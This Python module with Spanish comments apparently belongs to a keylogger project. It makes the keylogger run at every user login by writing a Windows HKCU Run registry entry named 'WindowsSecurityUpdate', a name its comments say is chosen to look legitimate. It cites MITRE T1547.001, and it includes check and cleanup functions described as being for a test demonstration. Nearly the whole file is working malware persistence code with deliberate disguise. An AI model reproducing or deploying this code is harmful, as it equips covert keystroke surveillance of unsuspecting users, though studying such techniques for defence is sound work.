# persistencia.py — Mecanismo de persistencia via Registro de Windows
"""
Módulo de persistencia para Windows.

Mecanismo utilizado: Clave de registro HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run

Esta clave es ejecutada automáticamente por Windows al iniciar sesión
el usuario actual, sin requerir privilegios de administrador.

Ventaja sobre otros mecanismos:
  - No requiere admin (HKCU vs HKLM)
  - Persiste entre reinicios
  - Es el mecanismo más común documentado en malware real (MITRE T1547.001)

Limitación:
  - Solo se ejecuta cuando el usuario inicia sesión, no en arranque del SO.
  - Antivirus modernos monitorean esta clave activamente.
  - Si el usuario revisa regedit o autoruns, es visible.
"""

import os
import sys
import winreg

# Nombre de la entrada en el registro — debe parecer legítimo
REG_KEY_NAME = "WindowsSecurityUpdate"

# Ruta de la clave Run del usuario actual (no requiere admin)
REG_PATH = r"Software\Microsoft\Windows\CurrentVersion\Run"


def instalar_persistencia() -> bool:
    """
    Crea una entrada en el registro para ejecutar el keylogger
    automáticamente al iniciar sesión el usuario.

    Usa HKEY_CURRENT_USER (HKCU) — no requiere privilegios de administrador.
    El valor apunta al ejecutable actual (sys.executable + script).

    Retorna:
        bool: True si se instaló correctamente, False si falló.
    """
    # Ruta completa al intérprete Python + este script
    # Cuando compiles con PyInstaller será solo sys.executable
    ruta_ejecutable = f'"{sys.executable}" "{os.path.abspath(sys.argv[0])}"'

    try:
        # Abrir (o crear) la clave Run con permisos de escritura
        clave = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            REG_PATH,
            0,
            winreg.KEY_SET_VALUE
        )
        # Crear el valor de tipo REG_SZ (string) con la ruta del ejecutable
        winreg.SetValueEx(clave, REG_KEY_NAME, 0, winreg.REG_SZ, ruta_ejecutable)
        winreg.CloseKey(clave)
        print(f"[+] Persistencia instalada: {REG_KEY_NAME} → {ruta_ejecutable}")
        return True

    except OSError as e:
        print(f"[!] Error instalando persistencia: {e}")
        return False


def verificar_persistencia() -> bool:
    """
    Verifica si la entrada de registro ya existe.

    Útil para no duplicar la entrada en cada ejecución,
    y para comprobar que la persistencia sigue activa.

    Retorna:
        bool: True si la clave ya existe, False si no.
    """
    try:
        clave = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            REG_PATH,
            0,
            winreg.KEY_READ
        )
        winreg.QueryValueEx(clave, REG_KEY_NAME)
        winreg.CloseKey(clave)
        return True
    except FileNotFoundError:
        return False


def desinstalar_persistencia() -> bool:
    """
    Elimina la entrada del registro.

    Útil para limpiar el entorno de pruebas después de la demostración.
    En un escenario real, el malware no incluiría esta función.

    Retorna:
        bool: True si se eliminó correctamente, False si falló.
    """
    try:
        clave = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            REG_PATH,
            0,
            winreg.KEY_SET_VALUE
        )
        winreg.DeleteValue(clave, REG_KEY_NAME)
        winreg.CloseKey(clave)
        print(f"[+] Persistencia eliminada: {REG_KEY_NAME}")
        return True
    except FileNotFoundError:
        print("[!] La entrada de registro no existe.")
        return False